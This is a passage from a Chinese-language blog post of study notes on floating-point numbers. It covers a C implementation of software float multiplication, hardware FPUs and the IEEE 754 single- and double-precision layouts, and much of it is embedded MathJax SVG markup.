data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g></g></svg></mjx-container></span></p>
<p>这样我们通过提取一个系数2增加了e，又能够成功将m的值域变回 <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="4.778ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 2111.7 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z"></path></g><g data-mml-node="mn" transform="translate(278,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g><g data-mml-node="mo" transform="translate(778,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mn" transform="translate(1222.7,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(1722.7,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></span>。</p>
<ul>
<li><strong>可能因为精度不够而无法对结果进行表示</strong>，因为
<code>m_a * m_b</code>
可能会超过可表示的范围。我们能够做的就是进行四舍五入。</li>
</ul>
<p>完整的乘法实现如下，由于计算 <code>m_a * m_b</code>
需要<strong>额外的精度</strong>，我们使用 64
位整数进行中间计算，并进行标准化处理：：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">fp operator*(fp a, fp b) {</span><br><span class="line">    fp c;</span><br><span class="line">    c.s = a.s ^ b.s;	<span class="comment">// 计算符号位</span></span><br><span class="line">    c.e = a.e + b.e;	<span class="comment">// 计算指数</span></span><br><span class="line">    </span><br><span class="line">    <span class="type">uint64_t</span> x = a.m, y = b.m; <span class="comment">// 转换为 64 位整数进行计算</span></span><br><span class="line">    <span class="type">uint64_t</span> m = (x &lt;&lt; <span class="number">31</span>) + (y &lt;&lt; <span class="number">31</span>) + x * y; <span class="comment">// 计算 62 或 63 位的中间结果</span></span><br><span class="line">    <span class="keyword">if</span> (m &amp; (<span class="number">1</span>&lt;&lt;<span class="number">62</span>)) { 			<span class="comment">// 检查是否溢出</span></span><br><span class="line">        m -= (<span class="number">1</span>&lt;&lt;<span class="number">62</span>); 			<span class="comment">// m -= 1;</span></span><br><span class="line">        m &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">        c.e++;		<span class="comment">// 指数加 1</span></span><br><span class="line">    }</span><br><span class="line">    m += (<span class="number">1</span>&lt;&lt;<span class="number">30</span>); 	<span class="comment">// 进行四舍五入（加 0.5）</span></span><br><span class="line">    c.m = m &gt;&gt; <span class="number">31</span>;	<span class="comment">// 舍入并截取尾数</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> c;</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>
<h5 id="硬件浮点运算"><strong>硬件浮点运算</strong></h5>
<p>在某些应用中，我们需要<strong>更高的精度</strong>，这时候可以使用<strong>软件浮点运算</strong>（如
<code>fp</code>
结构体实现的方式）。但是，软件浮点计算的<strong>效率很低</strong>，因为它需要执行多个指令。</p>
<p>为了提高效率，<strong>现代 CPU 使用专门的硬件单元</strong>（如 x86
的<strong>浮点运算单元 FPU</strong>，又称 x87）。这些单元提供：</p>
<ul>
<li><strong>专门的寄存器</strong>（x87 寄存器栈）</li>
<li><strong>支持浮点运算的指令集</strong></li>
<li><strong>支持三角函数、指数、对数、平方根等复杂运算</strong></li>
</ul>
<p>这些硬件优化让浮点计算变得高效，并且大多数现代处理器都集成了浮点单元（如
x86 的 SSE、AVX 指令集）。</p>
<p>在后续部分，我们会探讨<strong>浮点数表示的一些更详细的特性</strong>，以及它如何在现代
CPU 中实际运作。</p>
<h4 id="ieee-754-浮点算术标准">IEEE 754 浮点算术标准</h4>
<p>当我们设计自己的浮点数类型时，我们省略了许多重要的细节，例如：</p>
<ul>
<li><strong>我们应该为尾数（Mantissa）和指数（Exponent）分别分配多少位？</strong></li>
<li><strong>符号位（Sign bit）为 0
是否表示正数，还是相反？</strong></li>
<li><strong>这些位在内存中是如何存储的？</strong></li>
<li><strong>零（0）应该如何表示？</strong></li>
<li><strong>具体的舍入（Rounding）规则是什么？</strong></li>
<li><strong>如果我们对零进行除法运算，会发生什么？</strong></li>
<li><strong>如果我们对负数求平方根，会发生什么？</strong></li>
<li><strong>如果我们递增到最大可表示的数，会发生什么？</strong></li>
<li><strong>我们是否能检测到上述某些特殊情况发生了？</strong></li>
</ul>
<p>在早期计算机中，通常不支持浮点运算。当各大厂商开始添加浮点协处理器时，它们对这些问题的答案各不相同。不同的浮点数实现使得浮点运算的可靠性和可移植性变得困难，尤其是对编译器开发者而言。</p>
<p><strong>IEEE 754 标准</strong> 1985
年，<strong>IEEE（电气和电子工程师学会）</strong> 发布了 IEEE 754
标准，该标准正式规范了浮点数的运作方式。很快，各大厂商纷纷采纳该标准，如今它几乎被所有通用计算机采用。</p>
<p>与我们自己实现的浮点数类似，<strong>硬件浮点数</strong> 采用 1
位表示符号，指数和尾数部分的位数则因格式而异。例如，<strong>标准的 32
位浮点数（单精度）</strong> 采用：</p>
<ul>
<li><strong>最高位（1 位）</strong>：符号位（Sign bit）</li>
<li><strong>接下来的 8 位</strong>：指数位（Exponent）</li>
<li><strong>剩下的 23 位</strong>：尾数（Mantissa）</li>
</ul>
<img lazyload="" src="/images/loading.svg" data-src="/blog/2025/03/15/Algorithmica-HPC%E7%A0%94%E8%AF%BB%E8%AE%B0%E5%BD%952/float.svg" class="">
<p>采用这个存储顺序的原因之一是便于比较和排序。
在硬件中，我们可以直接使用<strong>无符号整数比较器</strong>来比较浮点数，仅在负数情况下对部分位进行翻转，以确保比较的正确性。</p>
<p><strong>指数的偏移量（Bias）</strong></p>
<p>为了表示小于 1 的值（负指数），IEEE 754
<strong>对指数值进行了偏移</strong>： 实际的指数值 =
<strong>存储的指数值 - 偏移量（Bias）</strong></p>
<ul>
<li>对于 <strong>单精度浮点数（float）</strong>，偏移量是
<strong>127</strong>，即： <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.357ex;" xmlns="http://www.w3.org/2000/svg" width="18.522ex" height="1.886ex" role="img" focusable="false" viewBox="0 -676 8186.8 833.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="TeXAtom" transform="translate(499,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mtext"><path data-c="72" d="M36 46H50Q89 46 97 60V68Q97 77 97 91T98 122T98 161T98 203Q98 234 98 269T98 328L97 351Q94 370 83 376T38 385H20V408Q20 431 22 431L32 432Q42 433 60 434T96 436Q112 437 131 438T160 441T171 442H174V373Q213 441 271 441H277Q322 441 343 419T364 373Q364 352 351 337T313 322Q288 322 276 338T263 372Q263 381 265 388T270 400T273 405Q271 407 250 401Q234 393 226 386Q179 341 179 207V154Q179 141 179 127T179 101T180 81T180 66V61Q181 59 183 57T188 54T193 51T200 49T207 48T216 47T225 47T235 46T245 46H276V0H267Q249 3 140 3Q37 3 28 0H20V46H36Z"></path><path data-c="65" d="M28 218Q28 273 48 318T98 391T163 433T229 448Q282 448 320 430T378 380T406 316T415 245Q415 238 408 231H126V216Q126 68 226 36Q246 30 270 30Q312 30 342 62Q359 79 369 104L379 128Q382 131 395 131H398Q415 131 415 121Q415 117 412 108Q393 53 349 21T250 -11Q155 -11 92 58T28 218ZM333 275Q322 403 238 411H236Q228 411 220 410T195 402T166 381T143 340T127 274V267H333V275Z" transform="translate(392,0)"></path><path data-c="61" d="M137 305T115 305T78 320T63 359Q63 394 97 421T218 448Q291 448 336 416T396 340Q401 326 401 309T402 194V124Q402 76 407 58T428 40Q443 40 448 56T453 109V145H493V106Q492 66 490 59Q481 29 455 12T400 -6T353 12T329 54V58L327 55Q325 52 322 49T314 40T302 29T287 17T269 6T247 -2T221 -8T190 -11Q130 -11 82 20T34 107Q34 128 41 147T68 188T116 225T194 253T304 268H318V290Q318 324 312 340Q290 411 215 411Q197 411 181 410T156 406T148 403Q170 388 170 359Q170 334 154 320ZM126 106Q126 75 150 51T209 26Q247 26 276 49T315 109Q317 116 318 175Q318 233 317 233Q309 233 296 232T251 223T193 203T147 166T126 106Z" transform="translate(836,0)"></path><path data-c="6C" d="M42 46H56Q95 46 103 60V68Q103 77 103 91T103 124T104 167T104 217T104 272T104 329Q104 366 104 407T104 482T104 542T103 586T103 603Q100 622 89 628T44 637H26V660Q26 683 28 683L38 684Q48 685 67 686T104 688Q121 689 141 690T171 693T182 694H185V379Q185 62 186 60Q190 52 198 49Q219 46 247 46H263V0H255L232 1Q209 2 183 2T145 3T107 3T57 1L34 0H26V46H42Z" transform="translate(1336,0)"></path></g></g></g><g data-mml-node="mo" transform="translate(1968,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msub" transform="translate(3023.8,0)"><g data-mml-node="mi"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="TeXAtom" transform="translate(499,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mtext"><path data-c="73" d="M295 316Q295 356 268 385T190 414Q154 414 128 401Q98 382 98 349Q97 344 98 336T114 312T157 287Q175 282 201 278T245 269T277 256Q294 248 310 236T342 195T359 133Q359 71 321 31T198 -10H190Q138 -10 94 26L86 19L77 10Q71 4 65 -1L54 -11H46H42Q39 -11 33 -5V74V132Q33 153 35 157T45 162H54Q66 162 70 158T75 146T82 119T101 77Q136 26 198 26Q295 26 295 104Q295 133 277 151Q257 175 194 187T111 210Q75 227 54 256T33 318Q33 357 50 384T93 424T143 442T187 447H198Q238 447 268 432L283 424L292 431Q302 440 314 448H322H326Q329 448 335 442V310L329 304H301Q295 310 295 316Z"></path><path data-c="74" d="M27 422Q80 426 109 478T141 600V615H181V431H316V385H181V241Q182 116 182 100T189 68Q203 29 238 29Q282 29 292 100Q293 108 293 146V181H333V146V134Q333 57 291 17Q264 -10 221 -10Q187 -10 162 2T124 33T105 68T98 100Q97 107 97 248V385H18V422H27Z" transform="translate(394,0)"></path><path data-c="6F" d="M28 214Q28 309 93 378T250 448Q340 448 405 380T471 215Q471 120 407 55T250 -10Q153 -10 91 57T28 214ZM250 30Q372 30 372 193V225V250Q372 272 371 288T364 326T348 362T317 390T268 410Q263 411 252 411Q222 411 195 399Q152 377 139 338T126 246V226Q126 130 145 91Q177 30 250 30Z" transform="translate(783,0)"></path><path data-c="72" d="M36 46H50Q89 46 97 60V68Q97 77 97 91T98 122T98 161T98 203Q98 234 98 269T98 328L97 351Q94 370 83 376T38 385H20V408Q20 431 22 431L32 432Q42 433 60 434T96 436Q112 437 131 438T160 441T171 442H174V373Q213 441 271 441H277Q322 441 343 419T364 373Q364 352 351 337T313 322Q288 322 276 338T263 372Q263 381 265 388T270 400T273 405Q271 407 250 401Q234 393 226 386Q179 341 179 207V154Q179 141 179 127T179 101T180 81T180 66V61Q181 59 183 57T188 54T193 51T200 49T207 48T216 47T225 47T235 46T245 46H276V0H267Q249 3 140 3Q37 3 28 0H20V46H36Z" transform="translate(1283,0)"></path><path data-c="65" d="M28 218Q28 273 48 318T98 391T163 433T229 448Q282 448 320 430T378 380T406 316T415 245Q415 238 408 231H126V216Q126 68 226 36Q246 30 270 30Q312 30 342 62Q359 79 369 104L379 128Q382 131 395 131H398Q415 131 415 121Q415 117 412 108Q393 53 349 21T250 -11Q155 -11 92 58T28 218ZM333 275Q322 403 238 411H236Q228 411 220 410T195 402T166 381T143 340T127 274V267H333V275Z" transform="translate(1675,0)"></path><path data-c="64" d="M376 495Q376 511 376 535T377 568Q377 613 367 624T316 637H298V660Q298 683 300 683L310 684Q320 685 339 686T376 688Q393 689 413 690T443 693T454 694H457V390Q457 84 458 81Q461 61 472 55T517 46H535V0Q533 0 459 -5T380 -11H373V44L365 37Q307 -11 235 -11Q158 -11 96 50T34 215Q34 315 97 378T244 442Q319 442 376 393V495ZM373 342Q328 405 260 405Q211 405 173 369Q146 341 139 305T131 211Q131 155 138 120T173 59Q203 26 251 26Q322 26 373 103V342Z" transform="translate(2119,0)"></path></g></g></g><g data-mml-node="mo" transform="translate(5686.6,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(6686.8,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(500,0)"></path><path data-c="37" d="M55 458Q56 460 72 567L88 674Q88 676 108 676H128V672Q128 662 143 655T195 646T364 644H485V605L417 512Q408 500 387 472T360 435T339 403T319 367T305 330T292 284T284 230T278 162T275 80Q275 66 275 52T274 28V19Q270 2 255 -10T221 -22Q210 -22 200 -19T179 0T168 40Q168 198 265 368Q285 400 349 489L395 552H302Q128 552 119 546Q113 543 108 522T98 479L95 458V455H55V458Z" transform="translate(1000,0)"></path></g></g></g></svg></mjx-container></span></li>
<li>对于 <strong>双精度浮点数（double）</strong>，偏移量是
<strong>1023</strong>，即： <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.357ex;" xmlns="http://www.w3.org/2000/svg" width="19.653ex" height="1.864ex" role="img" focusable="false" viewBox="0 -666 8686.8 823.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="TeXAtom" transform="translate(499,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mtext"><path data-c="72" d="M36 46H50Q89 46 97 60V68Q97 77 97 91T98 122T98 161T98 203Q98 234 98 269T98 328L97 351Q94 370 83 376T38 385H20V408Q20 431 22 431L32 432Q42 433 60 434T96 436Q112 437 131 438T160 441T171 442H174V373Q213 441 271 441H277Q322 441 343 419T364 373Q364 352 351 337T313 322Q288 322 276 338T263 372Q263 381 265 388T270 400T273 405Q271 407 250 401Q234 393 226 386Q179 341 179 207V154Q179 141 179 127T179 101T180 81T180 66V61Q181 59 183 57T188 54T193 51T200 49T207 48T216 47T225 47T235 46T245 46H276V0H267Q249 3 140 3Q37 3 28 0H20V46H36Z"></path><path data-c="65" d="M28 218Q28 273 48 318T98 391T163 433T229 448Q282 448 320 430T378 380T406 316T415 245Q415 238 408 231H126V216Q126 68 226 36Q246 30 270 30Q312 30 342 62Q359 79 369 104L379 128Q382 131 395 131H398Q415 131 415 121Q415 117 412 108Q393 53 349 21T250 -11Q155 -11 92 58T28 218ZM333 275Q322 403 238 411H236Q228 411 220 410T195 402T166 381T143 340T127 274V267H333V275Z" transform="translate(392,0)"></path><path data-c="61" d="M137 305T115 305T78 320T63 359Q63 394 97 421T218 448Q291 448 336 416T396 340Q401 326 401 309T402 194V124Q402 76 407 58T428 40Q443 40 448 56T453 109V145H493V106Q492 66 490 59Q481 29 455 12T400 -6T353 12T329 54V58L327 55Q325 52 322 49T314 40T302 29T287 17T269 6T247 -2T221 -8T190 -11Q130 -11 82 20T34 107Q34 128 41 147T68 188T116 225T194 253T304 268H318V290Q318 324 312 340Q290 411 215 411Q197 411 181 410T156 406T148 403Q170 388 170 359Q170 334 154 320ZM126 106Q126 75 150 51T209 26Q247 26 276 49T315 109Q317 116 318 175Q318 233 317 233Q309 233 296 232T251 223T193 203T147 166T126 106Z" transform="translate(836,0)"></path><path data-c="6C" d="M42 46H56Q95 46 103 60V68Q103 77 103 91T103 124T104 167T104 217T104 272T104 329Q104 366 104 407T104 482T104 542T103 586T103 603Q100 622 89 628T44 637H26V660Q26 683 28 683L38 684Q48 685 67 686T104 688Q121 689 141 690T171 693T182 694H185V379Q185 62 186 60Q190 52 198 49Q219 46 247 46H263V0H255L232 1Q209 2 183 2T145 3T107 3T57 1L34 0H26V46H42Z" transform="translate(1336,0)"></path></g></g></g><g data-mml-node="mo" transform="translate(1968,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msub" transform="translate(3023.8,0)"><g data-mml-node="mi"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="TeXAtom" transform="translate(499,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mtext"><path data-c="73" d="M295 316Q295 356 268 385T190 414Q154 414 128 401Q98 382 98 349Q97 344 98 336T114 312T157 287Q175 282 201 278T245 269T277 256Q294 248 310 236T342 195T359 133Q359 71 321 31T198 -10H190Q138 -10 94 26L86 19L77 10Q71 4 65 -1L54 -11H46H42Q39 -11 33 -5V74V132Q33 153 35 157T45 162H54Q66 162 70 158T75 146T82 119T101 77Q136 26 198 26Q295 26 295 104Q295 133 277 151Q257 175 194 187T111 210Q75 227 54 256T33 318Q33 357 50 384T93 424T143 442T187 447H198Q238 447 268 432L283 424L292 431Q302 440 314 448H322H326Q329 448 335 442V310L329 304H301Q295 310 295 316Z"></path><path data-c="74" d="M27 422Q80 426 109 478T141 600V615H181V431H316V385H181V241Q182 116 182 100T189 68Q203 29 238 29Q282 29 292 100Q293 108 293 146V181H333V146V134Q333 57 291 17Q264 -10 221 -10Q187 -10 162 2T124 33T105 68T98 100Q97 107 97 248V385H18V422H27Z" transform="translate(394,0)"></path><path data-c="6F" d="M28 214Q28 309 93 378T250 448Q340 448 405 380T471 215Q471 120 407 55T250 -10Q153 -10 91 57T28 214ZM250 30Q372 30 372 193V225V250Q372 272 371 288T364 326T348 362T317 390T268 410Q263 411 252 411Q222 411 195 399Q152 377 139 338T126 246V226Q126 130 145 91Q177 30 250 30Z" transform="translate(783,0)"></path><path data-c="72" d="M36 46H50Q89 46 97 60V68Q97 77 97 91T98 122T98 161T98 203Q98 234 98 269T98 328L97 351Q94 370 83 376T38 385H20V408Q20 431 22 431L32 432Q42 433 60 434T96 436Q112 437 131 438T160 441T171 442H174V373Q213 441 271 441H277Q322 441 343 419T364 373Q364 352 351 337T313 322Q288 322 276 338T263 372Q263 381 265 388T270 400T273 405Q271 407 250 401Q234 393 226 386Q179 341 179 207V154Q179 141 179 127T179 101T180 81T180 66V61Q181 59 183 57T188 54T193 51T200 49T207 48T216 47T225 47T235 46T245 46H276V0H267Q249 3 140 3Q37 3 28 0H20V46H36Z" transform="translate(1283,0)"></path><path data-c="65" d="M28 218Q28 273 48 318T98 391T163 433T229 448Q282 448 320 430T378 380T406 316T415 245Q415 238 408 231H126V216Q126 68 226 36Q246 30 270 30Q312 30 342 62Q359 79 369 104L379 128Q382 131 395 131H398Q415 131 415 121Q415 117 412 108Q393 53 349 21T250 -11Q155 -11 92 58T28 218ZM333 275Q322 403 238 411H236Q228 411 220 410T195 402T166 381T143 340T127 274V267H333V275Z" transform="translate(1675,0)"></path><path data-c="64" d="M376 495Q376 511 376 535T377 568Q377 613 367 624T316 637H298V660Q298 683 300 683L310 684Q320 685 339 686T376 688Q393 689 413 690T443 693T454 694H457V390Q457 84 458 81Q461 61 472 55T517 46H535V0Q533 0 459 -5T380 -11H373V44L365 37Q307 -11 235 -11Q158 -11 96 50T34 215Q34 315 97 378T244 442Q319 442 376 393V495ZM373 342Q328 405 260 405Q211 405 173 369Q146 341 139 305T131 211Q131 155 138 120T173 59Q203 26 251 26Q322 26 373 103V342Z" transform="translate(2119,0)"></path></g></g></g><g data-mml-node="mo" transform="translate(5686.6,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(6686.8,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(500,0)"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(1000,0)"></path><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z" transform="translate(1500,0)"></path></g></g></g></svg></mjx-container></span></li>
</ul>
<p>假设上图为 IEEE 754 <strong>单精度浮点数</strong>： <span class="math display"><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="33.497ex" height="2.7ex" role="img" focusable="false" viewBox="0 -943.3 14805.6 1193.3"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mo" transform="translate(389,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(1167,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="msup" transform="translate(1667,0)"><g data-mml-node="mo"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="TeXAtom" transform="translate(422,413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g></g></g><g data-mml-node="mo" transform="translate(2714.8,0)"><path data-c="D7" d="M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z"></path></g><g data-mml-node="msup" transform="translate(3715,0)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 